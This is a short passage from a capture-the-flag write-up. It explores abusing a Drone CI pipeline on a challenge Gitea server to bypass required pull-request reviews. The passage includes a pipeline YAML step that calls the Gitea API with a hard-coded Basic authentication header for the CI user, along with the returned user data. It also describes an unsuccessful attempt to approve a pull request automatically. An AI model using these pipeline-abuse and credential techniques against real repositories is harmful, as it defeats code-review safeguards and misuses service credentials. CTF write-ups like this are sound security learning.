## Afterthoughts

Since this is done, after the actual competition (I did not mange to solve this in time), we had a few discussions in discord.
As per the admins, the intended solution, should take advantage of [this issue](
https://medium.com/cider-sec/bypassing-required-reviews-using-github-actions-6e1b29135cc7#:~:text=A%20newly%20discovered%20security%20flaw,down%20the%20pipeline%20to%20production), so let's try to also merge to master fully automated 🤣


We can check, if the Basic Autentication for the drone ci user works by checking the gitea REST API from our pripeline
```yaml
---
kind: pipeline
type: exec
name: default

platform:
  os: linux
  arch: amd64

steps:
  - name: checkThatApiWorks
    commands:
    - |-
      curl -X 'GET' \
      'http://git.challenge.nahamcon.com:32482/api/v1/user' \
      -H 'accept: application/json' \
      -H 'authorization: Basic ZHJvbmVjaTp0NEswQHMhcVNG' > droneci-user.txt      
    - cat droneci-user.txt
  - name: linting
    commands:
      - phplint --lint .
```

Indeed, we ware able to access the user data of the user:

```
+ cat droneci-user.txt

{"id":5,"login":"droneci","full_name":"","email":"droneci@justhacking.com","avatar_url":"http://git.challenge.nahamcon.com:32482/avatars/bdc114a4c065404fbc1f7edea5ef85f9","language":"de-DE","is_admin":false,"last_login":"2022-05-01T18:34:37Z","created":"2022-04-23T15:58:48Z","restricted":false,"active":true,"prohibit_login":false,"location":"","website":"","description":"","visibility":"private","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"droneci"}
```

Now let's again create a pull request manually and check if we can execute an approval by the REST API.  
We can debug Giteas REST API by using the proviedes swagger-endpoint `/api/swagger`

**The request got to the server, but the PR is still in state pending fro some reason.**

![image](assets/testAutomaticPRApproval-Failed.PNG)
